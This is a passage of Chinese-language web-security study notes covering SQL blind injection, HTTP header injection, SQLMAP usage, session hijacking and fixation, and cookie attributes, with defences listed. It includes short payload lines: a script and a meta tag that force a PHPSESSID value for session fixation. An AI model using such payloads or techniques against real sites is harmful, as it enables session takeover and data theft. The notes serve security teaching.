又称延时注入，即使用具有延时功能的函数sleep、benchmark等，通过判断这些函数是否正常执行来获取数据库中的数据。</li></ul><h5 id="SQL盲注常用函数"><a href="#SQL盲注常用函数" class="headerlink" title="SQL盲注常用函数"></a>SQL盲注常用函数</h5><ol><li>条件语句</li></ol><p><img src="https://pic.imgdb.cn/item/67511fffd0e0a243d4ddc75c.png"></p><p><img src="https://pic.imgdb.cn/item/67512083d0e0a243d4ddc7fa.png"></p><p><img src="https://pic.imgdb.cn/item/675121f2d0e0a243d4ddcaea.png"></p><p><img src="https://pic.imgdb.cn/item/6751221ad0e0a243d4ddcb54.png"></p><p><img src="https://pic.imgdb.cn/item/67512239d0e0a243d4ddcb7d.png"></p><p><img src="https://pic.imgdb.cn/item/675122ecd0e0a243d4ddccd2.png"></p><p>​<img src="https://pic.imgdb.cn/item/67512328d0e0a243d4ddcd52.png"></p><p><img src="https://pic.imgdb.cn/item/67512384d0e0a243d4ddcdf7.png"></p><p><img src="https://pic.imgdb.cn/item/675123b9d0e0a243d4ddce59.png"></p><h5 id="SQL盲注实例"><a href="#SQL盲注实例" class="headerlink" title="SQL盲注实例"></a>SQL盲注实例</h5><ol><li>基于布尔的盲注实例</li></ol><p><img src="https://pic.imgdb.cn/item/67524894d0e0a243d4de5f48.png"></p><p><img src="https://pic.imgdb.cn/item/67524d8cd0e0a243d4de6052.png"></p><p><img src="https://pic.imgdb.cn/item/67524d9cd0e0a243d4de6059.png"></p><p><img src="https://pic.imgdb.cn/item/67524db7d0e0a243d4de605e.png"></p><p><img src="https://pic.imgdb.cn/item/67524dcfd0e0a243d4de6065.png"></p><p><img src="https://pic.imgdb.cn/item/67524de8d0e0a243d4de6068.png"></p><p><img src="https://pic.imgdb.cn/item/67524dfad0e0a243d4de606b.png"></p><ol start="2"><li>基于时间的盲注实例</li></ol><p><img src="https://pic.imgdb.cn/item/67524e40d0e0a243d4de6074.png"></p><p><img src="https://pic.imgdb.cn/item/67555658d0e0a243d4dfebf3.png"></p><p><img src="https://pic.imgdb.cn/item/67555671d0e0a243d4dfec08.png"></p><p><img src="https://pic.imgdb.cn/item/6755567fd0e0a243d4dfec17.png"></p><p><img src="https://pic.imgdb.cn/item/67555695d0e0a243d4dfec2e.png"></p><p><img src="https://pic.imgdb.cn/item/675556a8d0e0a243d4dfec42.png"></p><h4 id="4-3-5-HTTP文件头注入"><a href="#4-3-5-HTTP文件头注入" class="headerlink" title="4.3.5 HTTP文件头注入"></a>4.3.5 HTTP文件头注入</h4><h5 id="HTTP-Header概述"><a href="#HTTP-Header概述" class="headerlink" title="HTTP Header概述"></a>HTTP Header概述</h5><ol><li>HTTP工作原理</li></ol><p><img src="https://pic.imgdb.cn/item/675557fed0e0a243d4dfed74.png"></p><ol start="2"><li>HTTP报文类型</li></ol><p><img src="https://pic.imgdb.cn/item/6755581dd0e0a243d4dfed8a.png"></p><ol start="3"><li>HTTP请求报文组成</li></ol><p><img src="https://pic.imgdb.cn/item/6755a879d0e0a243d4e00586.png"></p><ol start="4"><li>HTTP请求的方法</li></ol><p><img src="https://pic.imgdb.cn/item/6755a900d0e0a243d4e005a2.png"></p><ol start="5"><li>HTTP响应报文组成</li></ol><p><img src="https://pic.imgdb.cn/item/6755aa9cd0e0a243d4e005ed.png"></p><ol start="6"><li>HTTP响应消息状态码</li></ol><p><img src="https://pic.imgdb.cn/item/6755aaf1d0e0a243d4e005ff.png"></p><ol start="7"><li>HTTP Header内容</li></ol><ul><li><p><strong>User-Agent</strong>：使服务器能够识别客户端使用的操作系统，浏览器版本等(很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等存入数据库中)</p></li><li><p><strong>Cookie</strong>：网站为了辨别用户身份、进行session跟踪而储存在用户本地终端上的数据(通常经过加密)</p></li><li><p><strong>Host</strong>：客户端指定自己想访问的Web服务器的域名/IP地址和端口号。</p></li><li><p><strong>X-Forwarded-For</strong>：简称XFF头，它代表客户端(即HTTP的请求端)真实的IP(通常一些网站的防注入功能会记录请求端真实IP地址并写入数据库或某文件，通过修改XFF头可以实现伪造IP)</p></li><li><p><strong>Client-lP</strong>：同上。</p></li><li><p><strong>Referer</strong>：浏览器向Web服务器表明自己是从哪个页面链接过来的。</p></li></ul><h5 id="HTTP-Header注入"><a href="#HTTP-Header注入" class="headerlink" title="HTTP Header注入"></a>HTTP Header注入</h5><p>​有时候，后台开发人员为了验证客户端HTTP Header(比如常用的Cookie验证等)或者通过HTTP Header头信息获取客户端的一些信息(比如User-Agent、Accept字段等)会对客户端HTTP Header进行获取并使用SQL语句进行处理，如果此时没有足够的安全考虑，就可能导致基于HTTP Header的注入漏洞。</p><ol><li>HTTP Header注入的前提条件</li></ol><ul><li>能够对请求头消息进行修改</li><li>修改的请求头信息能够带入数据库执行</li><li>数据库没有对输入的请求头做过滤</li></ul><ol start="2"><li>常见的HTTP Header注入类型</li></ol><ul><li>Cookie注入</li><li>Referer注入</li><li>User-Agent注入</li><li>XFF注入</li></ul><h6 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h6><p>常见场合：服务器对cookie字段进行获取，以验证客户端的身份。</p><p><img src="https://pic.imgdb.cn/item/675643edd0e0a243d4e01500.png"></p><h6 id="Referer注入"><a href="#Referer注入" class="headerlink" title="Referer注入"></a>Referer注入</h6><p>常见场合：服务器记录referer字段用于统计网站的点击量。</p><p><img src="https://pic.imgdb.cn/item/67564435d0e0a243d4e01507.png"></p><h6 id="User-Agent注入"><a href="#User-Agent注入" class="headerlink" title="User-Agent注入"></a>User-Agent注入</h6><p>常见场合:</p><p>(1)服务器记录访问者的信息，如浏览器版本、操作系统版本等<br>(2)服务器根据User-Agent提供的信息来给客户端推送不同的网页。</p><p><img src="https://pic.imgdb.cn/item/675644d9d0e0a243d4e0151c.png"></p><h6 id="XFF注入"><a href="#XFF注入" class="headerlink" title="XFF注入"></a>XFF注入</h6><p>常见场合：一些网站的防注入功能会记录客户端真实IP地址并写入数据库</p><p><img src="https://pic.imgdb.cn/item/675644ecd0e0a243d4e0151e.png"></p><p><strong>HTTP Header注入实例</strong></p><p><img src="https://pic.imgdb.cn/item/67564550d0e0a243d4e01529.png"></p><p>注入点：</p><p><img src="https://pic.imgdb.cn/item/67564603d0e0a243d4e01545.png"></p><p><img src="https://pic.imgdb.cn/item/67564eb0d0e0a243d4e01682.png"></p><p><strong>因为此处使用的是insert而不是select语句，所以只能使用报错注入，而不能使用联合查询到</strong></p><h4 id="4-3-6-SQLMAP基础"><a href="#4-3-6-SQLMAP基础" class="headerlink" title="4.3.6 SQLMAP基础"></a>4.3.6 SQLMAP基础</h4><h5 id="SQLMAP简介"><a href="#SQLMAP简介" class="headerlink" title="SQLMAP简介"></a>SQLMAP简介</h5><p>​SQLMAP是一个开源的自动化SQL注入工具，其主要功能是扫描、发现并利用给定的URL的SQL注入漏洞。</p><ol><li><p>SQLMAP使用教程<br> <a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">https://github.com/sqlmapproject/sqlmap/wiki/Usage</a></p></li><li><p>SQLMAP可以对URL干嘛?</p></li></ol><ul><li>判断可注入的参数</li><li>判断可以使用哪一种SQL注入技术进行注入</li><li>判断识别数据库的类型</li><li>根据用户的选择，从数据库中读取数据</li></ul><ol start="3"><li>SQLMAP支持的注入技术</li></ol><ul><li>基于布尔的盲注:根据返回页面判断条件真假的注入。</li><li>基于时间的盲注:不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行(即页面返回时间是否增加)来判断。</li><li>基于报错的注入:页面会返回错误信息，或者把注入的语句的结果直接返回在页面中</li><li>基于联合查询的注入:可以使用UNION的情况下的注入，</li><li>堆查询注入:同时执行多条语句的注入。</li></ul><ol start="4"><li>SQLMAP支持的数据库类型</li></ol><ul><li>主要包括一些关系型数据库(RMDBS)，如MySQL、Oracle、PostgreSQL、Microsoft SOL Server、Microsoft Access、lBM DB2、SQLite、 Firebird、Sybase、SAP MaxDB、Informix、HSQLDB等</li></ul><ol start="5"><li>SQLMAP检测注入漏洞的流程</li></ol><ul><li>网站连通性检测：检测目标的连接状态</li><li>WAF探测：检测网站是否受WAF保护</li><li>网页稳定性检测：检测网页是否稳定</li><li>参数动态性检测：检测参数是否具有动态性</li><li>启发式注入检测：探测该参数点是否是动态的、是否为可能的注入点</li></ul><ol start="6"><li>SQLMAP的误报检测机制</li></ol><ul><li>误报检测：SQLMAP的布尔盲注、时间盲注方式判断注入点时，存在误报的可能为防止误报，SQLMap引入了误报检测机制。</li><li>两个基础检测算法<ul><li>页面相似度对比技术(在各种注入技术中大量使用):在SQLMap检测的整个过程中，会有一个原始响应的定义，指的是在网站连通性检测的过程中，如果网站成功响应，则把该响应定义为原始响应(包括状态码、HTTP响应头、HTTP响应一个HTTP请求成功响应后，将与原始响应进行对比，得出对比结果，算体)。法输出为True表示当前响应与原始响应相似，算法输出为False表示当前响应与原始响应不相似。</li><li>高斯分布识别响应机制(在UNION注入和时间盲注过程中使用):网站的响应是基于逻辑的，如果一组请求，网站的处理逻辑相同，那么响应几乎也是相同的如果某一个响应出现了变化，则可以认为网站处理逻辑变了，这种逻辑的变化，可能正是因为注入成功了</li></ul></li></ul><h5 id="SQLMAP基本使用"><a href="#SQLMAP基本使用" class="headerlink" title="SQLMAP基本使用"></a>SQLMAP基本使用</h5><h6 id="u参数（GET）"><a href="#u参数（GET）" class="headerlink" title="-u参数（GET）"></a>-u参数（GET）</h6><p><img src="https://pic.imgdb.cn/item/675656aad0e0a243d4e01834.png"></p><p><img src="https://pic.imgdb.cn/item/675656e5d0e0a243d4e0183c.png"></p><h6 id="r参数（POST）"><a href="#r参数（POST）" class="headerlink" title="-r参数（POST）"></a>-r参数（POST）</h6><p><img src="https://pic.imgdb.cn/item/67565f53d0e0a243d4e01ca6.png"></p><p><img src="https://pic.imgdb.cn/item/67565fcfd0e0a243d4e01d6a.png"></p><p><img src="https://pic.imgdb.cn/item/6756622bd0e0a243d4e02108.png"></p><p><img src="https://pic.imgdb.cn/item/6756623fd0e0a243d4e0212e.png"></p><p><img src="https://pic.imgdb.cn/item/67566256d0e0a243d4e0213e.png"></p><p><img src="https://pic.imgdb.cn/item/67566272d0e0a243d4e0216c.png"></p><h6 id="m参数（多个URL）"><a href="#m参数（多个URL）" class="headerlink" title="-m参数（多个URL）"></a>-m参数（多个URL）</h6><p><img src="https://pic.imgdb.cn/item/67566291d0e0a243d4e021a7.png"></p><h3 id="第四部分-XSS漏洞原理与验证"><a href="#第四部分-XSS漏洞原理与验证" class="headerlink" title="第四部分 XSS漏洞原理与验证"></a>第四部分 XSS漏洞原理与验证</h3><h4 id="4-4-1-会话管理"><a href="#4-4-1-会话管理" class="headerlink" title="4.4.1 会话管理"></a>4.4.1 会话管理</h4><h5 id="Web会话管理概述"><a href="#Web会话管理概述" class="headerlink" title="Web会话管理概述"></a>Web会话管理概述</h5><ol><li>会话管理</li></ol><p>​在人机交互时，会话管理是保持用户的整个会话活动的互动与计算机系统跟踪过程，会话管理分类：桌面会话管理、浏览器会话管理、Web服务器的会话管理。</p><ol start="2"><li>为什么需要会话管理</li></ol><p>​HTTP是一种无状态协议，一次请求结束，客户端与服务端的连接就会断开，服务器再次收到请求时，无法识别此次请求是哪个用户发过来的，需要重新建立连接。为了判断发送请求的用户，需要一种记录用户的方式，也就是Web应用会话管理。</p><ol start="3"><li>常见的Web应用会话管理的方式</li></ol><ul><li>基于server端session的管理方式</li><li>cookie-based的管理方式</li><li>token-based的管理方式</li></ul><h5 id="Web会话管理方式"><a href="#Web会话管理方式" class="headerlink" title="Web会话管理方式"></a>Web会话管理方式</h5><h6 id="基于server端session的管理的方式"><a href="#基于server端session的管理的方式" class="headerlink" title="基于server端session的管理的方式"></a>基于server端session的管理的方式</h6><p>​在早期的Web应用中，通常使用服务端session来管理用户的会话<br>​服务端session是用户第一次访问应用时，服务器就会创建的对象，代表用户的一次会话过程，可以用来存放数据。服务器为每一个session都分配一个唯一的sessionID，以保证每个用户都有一个不同的session对象。<br>​服务器在创建完session后，会把sessionID通过cookie返回给用户所在的浏览器，这样当用户第二次及以后向服务器发送请求的时候，就会通过cookie把sessionID传回给服务器，以便服务器能够根据sessionID找到与该用户对应的session对象。<br>​session通常设定有有效时间，比如1个小时。当时间失效后，服务器会销毁之前的session，并创建新的session返回给用户。但是只要用户在失效时间内，有发送新的请求给服务器，通常服务器都会把他对应的session的有效时间根据当前的请求时间再重新刷新。<br>​session在一开始并不具备会话管理的作用。它只有在用户登录认证成功之后，并且往session对象里面放入了用户登录成功的凭证，才能用来管理会话。管理会话的逻辑也很简单，只要拿到用户的session对象，看它里面有没有登录成功的凭证，就能判断这个用户是否已经登录。当用户主动退出的时候，会把它的session对象里的登录凭证清掉，所以在用户登录前或退出后或者session对象失效时，肯定都是拿不到需要的登录凭证的</p><p><img src="https://pic.imgdb.cn/item/6756847bd0e0a243d4e03873.png"></p><p>优点:<br>1、某些地方使用可以简化Web开发：如果在诸多Web页面间传递一个变量，那么用session变量要比通过QueryString传递变量可使问题简化。<br>2、安全性好：客户端与服务端保持会话状态的媒介始终只是一个sessionID串，只要这个串够随机，攻击者就不能轻易冒充他人的sessionID进行操作;除非通过CSRF或http劫持的方式，才有可能冒充别人进行操作;即使冒充成功，也必须被冒充的用户session里面包含有效的登录凭证才行。</p><p>缺点:<br>1、这种方式将会话信息存储在Web服务器里面，当用户同时在线量比较多时，这些会话信息会占据比较多的内存;<br>2、当应用采用集群部署的时候，会遇到多台web服务器之间如何做session共享的问题。<br>3、多个应用要共享session时，还会遇到跨域问题。不同的应用可能部署的主机不一样，需要在各个应用做好cookie跨域的处理。</p><p><img src="https://pic.imgdb.cn/item/67568596d0e0a243d4e038e3.png"></p><h6 id="cookie-based的管理方式"><a href="#cookie-based的管理方式" class="headerlink" title="cookie-based的管理方式"></a>cookie-based的管理方式</h6><p>​session的管理方式会增加服务器的负担和架构的复杂性，所以后来就提出把用户的登录凭证直接存到客户端的方案，当用户登录成功之后，把登录凭证写到cookie里面，并给cookie设置有效期，后续请求直接验证存有登录凭证的cookie是否存在以及凭证是否有效，即可判断用户的登录状态。</p><ul><li>Cookie与Session最大的区别<ul><li>Cookie将数据存储在客户端</li><li>Session将数据存储在服务端</li></ul></li></ul><p>​用户发起登录请求，服务端根据传入的用户密码之类的身份信息，验证用户是否满足登录条件，如果满足，就根据用户信息创建一个登录凭证，这个登录凭证简单来说就是一个对象，最简单的形式可以只包含用户id、凭证创建时间和过期时间三个值。</p><p>​服务端把上一步创建好的登录凭证，先对它做数字签名，然后再用对称加密算法做加密处理，将签名、加密后的字串，写入cookie。cookie的名字必须固定(如ticket)，因为后面再获取的时候，还得根据这个名字来获取cookie值。这一步添加数字签名的目的是防止登录凭证里的信息被篡改，因为一旦信息被篡改，那么下一步做签名验证的时候肯定会失败。做加密的目的，是防止cookie被别人截取的时候，无法轻易读到其中的用户信息。</p><p>​用户登录后发起后续请求，服务端根据上一步存登录凭证的cookie名字，获取到相关的cookie值。然后先做解密处理，再做数字签名的认证，如果这两步都失败，说明这个登录凭证非法;如果这两步成功，接着就可以拿到原始存入的登录凭证了。然后用这个凭证的过期时间和当前时间做对比，判断凭证是否过期，如果过期，就需要用户再重新登录;如果未过期，则允许请求继续。</p><p><img src="https://pic.imgdb.cn/item/675687e5d0e0a243d4e03a80.png"></p><p>优点:<br>1、实现了服务端的无状态化(最大的优点)，服务端只需要负责创建和验证登录cookie即可，无需保持用户的状态信息。<br>2、cookie可以跨越同域名下的的多个网页，但不能跨越多个域名使用<br>3、可以设置有效期限，控制cookie的生命周期，使之不会永远有效(攻击者可能拿到的是过期的cookie)</p><p>缺点:<br>1、cookie有大小限制，存储不了太多数据。<br>2、每次传送cookie，增加了请求的数量，对访问性能也有影响<br>3、同样存在跨域问题(不同域名无法互相读取cookie)</p><h6 id="token-based的管理方式"><a href="#token-based的管理方式" class="headerlink" title="token-based的管理方式"></a>token-based的管理方式</h6><p>​Session和Cookie两种会话管理方式由于都要用到Cookie，不适合用在native app里面，因为native app不是浏览器，不好管理Cookie，因此都不适合做纯API服务的登录认证。要实现API服务的登录认证，就需要用到token-based的会话管理方式。</p><p>​token-based的管理方式从流程上和实现上跟cookie-based的管理方式没有太多区别，只不过cookie-based的管理方式中写到cookie里面的ticket在这种方式下称为token，这个token在返回给客户端之后，后续请求都必须通过url参数或者是http header的形式，主动带上token，这样服务端接收到请求之后就能直接从http header或者url里面取到token进行验证。</p><p><img src="https://pic.imgdb.cn/item/675689d8d0e0a243d4e03bb9.png"></p><p>优点:<br>1、支持跨域访问：Cookie是不支持跨域访问的，Token支持<br>2、无状态：Token无状态，Session有状态(有状态和无状态最大的区别就是服务端会不会保存客户端的信息)<br>3、支持移动设备：Token更适用于移动应用，Cookie不支持手机端访问</p><p>缺点:<br>1、占带宽:正常情况下Token要比sessionID更大，需要消耗更多的流量，挤占更多带宽<br>2、无法在服务端注销，很难解决劫持问题</p><h5 id="Web会话管理安全问题"><a href="#Web会话管理安全问题" class="headerlink" title="Web会话管理安全问题"></a>Web会话管理安全问题</h5><p>​在Web应用里，会话管理的安全性始终是最重要的安全问题，对用户的影响极大。</p><p>​从会话管理凭证来说，Session会话管理的会话凭证仅仅是一个sessionID，所以只要这个sessionID足够随机，那么攻击者就不会轻易地冒充别人的sessionID进行操作;Cookie会话管理的凭证(ticket)以及Token会话管理证(token)都是一个在服务端做了数字签名和加密处理的串，所以只要密钥不泄露，攻击者也无法轻易拿到这个串中有效信息并对它进行篡改。总之，这三种会话管理方式的凭证本身是比较安全的。</p><p>​从客户端和服务端的HTTP过程来说，当攻击者截获到客户端请求中的会话凭证就能拿这个凭证冒充原用户，做一些非法操作，而服务器也认不出来。这种安全问题可以简单采用HTTPS来解决，虽然可能还有HTTP劫持这种更高程度的威胁存在，但是从代码能做的防范，确实也就是这个层次了。</p><h4 id="4-4-2-Session攻击"><a href="#4-4-2-Session攻击" class="headerlink" title="4.4.2 Session攻击"></a>4.4.2 Session攻击</h4><h5 id="Session攻击简介"><a href="#Session攻击简介" class="headerlink" title="Session攻击简介"></a>Session攻击简介</h5><p>​Session对于Web应用是最重要的，也是最复杂的。对于Web应用程序来说，加强安全性的首要原则就是：<strong>不要信任来自客户端的数据，一定要进行数据验证以及过滤</strong>才能在程序中使用，再保存到数据层。然而，为了维持来自同一个用户的不同请求之间的状态，客户端必须要给服务器端发送一个唯一的身份标识符(Session ID)。 很显然，这和前面提到的安全原则是矛盾的，但是没有办法，http协议是无状态的，为了维持状态，我们别无选择。由此可以看出，Web应用程序中最脆弱的环节就是session，因为服务器端是通过来自客户端的一个身份标识来认证用户的，所以session是Web应用程序中最需要加强安全性的环节。</p><ol><li>主要攻击方式</li></ol><p>​基于session的攻击有很多种方式。大部分的手段都是首先通过捕获或者固定合法用户的session，然后冒充该用户来访问系统。也就是说，攻击者至少必须要获取到一个有效的session标识符，用于接下来的身份验证。</p><p>攻击者至少可以通过以下三种方式来获取一个有效的session标识符</p><ul><li>预测</li><li>捕获(劫持)</li><li>固定</li></ul><h5 id="会话预测"><a href="#会话预测" class="headerlink" title="会话预测"></a>会话预测</h5><ol><li>原理</li></ol><p>​会话预测这种方式需要攻击者猜测出系统中使用的有效的session标识符(PHP中格式为PHPSESSID=1234)，类似暴力破解。</p><p>目前会话预测这种攻击方式基本上不太可能成功</p><ul><li>PHP生成随机的sessionid往往是极其复杂的并且难于被预测出来</li><li>PHP生成session字符串无任何规律和顺序</li></ul><h5 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h5><ol><li>含义</li></ol><ul><li><p>通过窃取合法用户SessionID后，使用该SessionID登录目标账号的攻击方法。</p></li><li><p>会话劫持最重要的部分是取得一个合法的会话标识来伪装成合法用户。</p></li></ul><ol start="2"><li>攻击步骤</li></ol><p>（1）目标用户需要先登录站点<br>（2）登录成功后，该用户会得到站点提供的一个会话标识SessionID<br>（3）<strong>攻击者通过某种攻击手段捕获SessionID</strong><br>（4）攻击者通过捕获到的SessionID访问站点即可获得目标用户合法会话</p><p><img src="https://pic.imgdb.cn/item/6756a022d0e0a243d4e043fe.png"></p><ol start="3"><li>攻击者获取SessionlD的方式</li></ol><ul><li>暴力破解：尝试各种SessionID，直到破解为止</li><li>预测：如果SessionID使用非随机的方式产生，那么就有可能计算出来</li><li>窃取：使用网络嗅探、XSS攻击等方法获得</li></ul><p>​对于php来说，其内部Session的实现机制虽然不是很安全，但是关于生成SessionlD的环节还是比较安全的，这个随机的SessionID往往是极其复杂的并且难于被预测出来，所以，暴力破解SessionID和预测SessionlD的攻击方式基本上是不太可能成功的。<br>​对于窃取SessionID的方式大多使用网络数据通讯层进行攻击获取，可以使用SSL进行防御。</p><ol start="4"><li>会话劫持防御方法</li></ol><p>（1）更改Session名称：PHP中Session的默认名称是PHPSESSID，此变量会保存在Cookie中，如果攻击者不分析站点，就不能猜到Session名称，可以阻挡部分攻击<br>（2）关闭透明化SessionlD：透明化SessionID指当浏览器中的Http请求没有使用Cookie来存放SessionlD时，SessionID则使用URL来传递。<br>（3）设置HttpOnly：通过设置Cookie的HttpOnly为true，可以防止客户端脚本访问这个Cookie，从而有效的防止XSS攻击。<br>（4）关闭所有phpinfo类dump request信息的页面：phpinfo页面会dump出请求信息，其中就包括Cookie信息<br>（5）验证HTTP头部信息</p><ol start="5"><li>中间人攻击(MITM)</li></ol><p>​中间人攻击(Man-in-the-MiddleAttack，简称“MITM攻击”)是一种通过窃取或篡改通信物理、逻辑链路间接完成攻击行为的网络攻击方法。攻击者与通信的两端分别创建独立的联系，并交换其所收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，实际上整个会话都被攻击者完全控制。这个被攻击者控制的通信节点就是所谓的“中间人“</p><ul><li><p>中间人攻击有两种常见形式：</p><ul><li><p>基于监听的信息窃取</p></li><li><p>基于监听的身份冒认</p></li></ul></li><li><p>中间人攻击难以防御的原因:</p></li></ul><p>（1）攻击者在窃听时，一般网络连接仍能正常运行，不会断线，因此很少有人会主动发现<br>（2）受害者电脑上不会被安装木马或恶意软件，难以被杀毒软件发现<br>（3）攻击者在欺骗网络协议时，虽然会留下一些蛛丝马迹，但由于网络设备不会保留太多记录，事后难以追踪<br>（4）绝大多数的网络协议，仍然基于“对方的数据是安全可靠”的假设来运作的，这导致攻击者有太多漏洞可以利用进行欺骗网络设备、伪装成中间人</p><h5 id="会话固定"><a href="#会话固定" class="headerlink" title="会话固定"></a>会话固定</h5><ol><li>含义</li></ol><ul><li>诱骗受害者使用攻击者指定的会话标识(SessionlD)的攻击手段。</li><li>这是攻击者获取合法会话标识的最简单的方法。(让合法用户使用攻击者预先设置的SessionID进行登录，从而使Web不再进行生产新的SessionID，导致攻击者预先设置的SessionID变成了合法桥梁)</li></ul><p>​会话固定也可以看成是会话劫持的一种类型，因为会话固定攻击的主要目的同样是获得目标用户的合法会话，不过会话固定还可以是强迫受害者使用攻击者设定的一个有效会话，以此来获得用户的敏感信息。</p><ol start="2"><li>攻击步骤</li></ol><p>（1）攻击者通过某种手段重置目标用户的SessionID，然后监听用户会话状态<br>（2）目标用户携带攻击者设定的SessionID登录站点<br>（3）攻击者通过SessionID获得合法会话</p><p><img src="https://pic.imgdb.cn/item/6756a450d0e0a243d4e04573.png"></p><ol start="3"><li>Web接收SessionID机制</li></ol><p>​早期浏览器存储的sessionID容易暴露、使用URL来传送sessionID<br>​首先检查携带cookie是否含有sessionID;若没有则再检查get、post数据中是否含有，若有则使用此数据;没有才会使系统生成一个sessionID发给客户端。</p><ol start="4"><li>重置Session lD的方式</li></ol><ul><li>使用客户端脚本来设置Cookie到浏览器</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.cookie="PHPSESSID=99999";&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure><p>这种方式可以使用XSS来达到目的</p><ul><li>使用HTML的&lt;META&gt;标签加Set-Cookie属性。</li></ul><p>服务器可以在返回的HTML文档中增加&lt;META&gt;标签来设置Cookie</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv='Set-Cookie'content='PHPSESSID=23333'&gt;</span><br></pre></td></tr></tbody></table></figure><p>与客户端脚本相比，对&lt;META&gt;标签的处理目前还不能被览器禁止</p><ul><li>使用Set-Cookie的HTTP响应头部设置Cookie</li></ul><p>攻击者可以使用一些方法在Web服务器的响应中加入Set-Cookie的HTTP响应头部</p><ol start="5"><li>防御方案</li></ol><p>（1）每当用户登陆的时候就进行重置SessionID<br>（2）Session lD闲置过久时，进行重置Session lD<br>（3）大部分防止会话劫持的方法对会话固定攻击同样有效。如设置HttpOnly，关闭透明化SessionlD，User-Agent验证，Token校验等</p><h4 id="4-4-3-Cookie安全"><a href="#4-4-3-Cookie安全" class="headerlink" title="4.4.3 Cookie安全"></a>4.4.3 Cookie安全</h4><h5 id="Cookie机制"><a href="#Cookie机制" class="headerlink" title="Cookie机制"></a>Cookie机制</h5><p>​一般来说，同域内浏览器中发出的任何一个请求都会带上Cookie，无论请求什么资源，请求时，Cookie出现在请求头的Cookie字段中。服务端响应头的Set-Cookie字段可以添加、修改和删除Cookie，客户端通过javascript也可以添加、修改和删除Cookie。另外，**<u>Cookie是无法跨浏览器存在的</u>**。<br>​利用Cookie机制，我们可以存储用户的会话信息，比如，用户登陆认证后的Session，之后同域内发出的请求都会带上认证后的会话信息，很方便。也因此，攻击者特别喜欢盗取Cookie，这相当于盗取了目标网站上的用户权限。</p><ol><li>Cookie重要字段</li></ol><ul><li>setcookie()函数用于设置cookie</li><li>[name][value][expires][path][domain][secure][httponly]</li></ul><p>​含义依次是：名称、值、过期时间、所属相对路径、域名、是否有Secure标志、否有HttpOnly标志</p><p><img src="https://pic.imgdb.cn/item/6756aa0bd0e0a243d4e049ab.png"></p><ol start="2"><li>子域Cookie机制</li></ol><p>Domain字段，设置cookie时，如果不指定则默认是本域。</p><p>例如x.xxx.com域通过javaScript设置一个cookie:</p><p>​Document.cookie=”test=1”</p><p>此时，domain值默认是x.xxx.com，如果通过javaScript设置一个父域:</p><p>​Document.cookie=”test=1”;domain=”xxx.com”</p><p>此时，domain域变成xxx.com，这样的好处就是可以在不同的子域共享Cookie;坏处就是攻击者通过控制其他子域也能读到这个Cookie。</p><p>注意：<strong>此机制不允许设置Cookie的domain为下一级子域或其他外域</strong>。</p><ol start="3"><li>路径Cookie机制</li></ol><p></p><p>path字段，设置cookie时，如不指定path的值，则默认是当前页面路径<br>        例如：<a href="http://www.xxx.com/admin/index.php%E9%A1%B5%E9%9D%A2%E9%80%9A%E8%BF%87JavaScript%E8%AE%BE%E7%BD%AE%E4%B8%80%E4%B8%AAcookie">www.xxx.com/admin/index.php页面通过JavaScript设置一个cookie</a> </p><p>​document.cookie=”test=1”<br>此时，path值默认是/admin/。<br>​通过指定path字段，JavaScript可以设置任意Cookie到任意路径下，但是只有目标路径(/admin/路径)下的页面JavaScript才能读取到该Cookie。但是，通过设置path不能防止重要的Cookie被窃取。比如/test/路径想读取/admin/路径的Cookie，可以通过跨iframe进行Dom操作实现。</p><ol start="4"><li>HttpOnly Cookie机制</li></ol><ul><li><p>HttpOnly是Cookie的一种属性，用于告诉浏览器不要向客户端脚本暴露Cookie。指仅在HTTP层面上传输Cookie，当设置了HttpOnly属性后，客户端脚本就无法读写该Cookie，能有效的防御XSS攻击获取Cookie。</p></li><li><p>设置</p></li></ul><p>Cookie操作函数setcookie函数也专门添加了第7个参数来做为HttpOnly的选项。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">开启方法为:</span><br><span class="line">&lt;?php</span><br><span class="line">setcookie("test","1",time()+3600,"","",0,0);//设置普通Cookie</span><br><span class="line">setcookie("test1","1",time()+3600,"","",0,1);//第7个参数(这里最后一个)是HttpOnly标志，0为关闭，1为开启，默认为0</span><br><span class="line">?&gt;</span><br></pre></td></tr></tbody></table></figure><p>HttpOnly开启会限制访问cookie，但是如果服务器响应页面有cookie调试信息，还是会导致cookie泄露</p><p><img src="https://pic.imgdb.cn/item/67584652d0e0a243d4e17f13.png"></p><p>CVE漏洞：</p><p><img src="https://pic.imgdb.cn/item/6758467ad0e0a243d4e17f25.png"></p><ol start="5"><li>Secure Cookie机制</li></ol><p>​Secure Cookie机制指的是设置了Secure标志的Cookie仅在HTTPS层面上安全传输，如果请求是HTTP的就不会带上这个Cookie，这样能降低重要的Cookie被中间人截获的风险。但是，Secure Cookie对于客户端脚本来说是可读写的，也就意味着，它能够被盗取和篡改。可通过如下的JS代码可对已知的Secure Cookie进行篡改:</p><p><img src="https://pic.imgdb.cn/item/6758474dd0e0a243d4e17f5a.png"></p><h5 id="Cookie存储"><a href="#Cookie存储" class="headerlink" title="Cookie存储"></a>Cookie存储</h5><ol><li>本地Cookie与内存Cookie</li></ol><p>​存储方式与过期时间(expires)相关。<br>​如果没设置过期时间，则是内存Cookie，这样的Cookie会随着浏览器关闭而从内存中消失;如果设置了过期时间，那么就是本地Cookie，这样的Cookie就会以文本形式保存在操作系统本地，待过期时间到了才会消失。<br>​document.cookie=”expires=1;expires=Mon, 01 Jan 2021 00:00:00 GMT”//GMT时间，2021年1月1日才会过期</p><ol 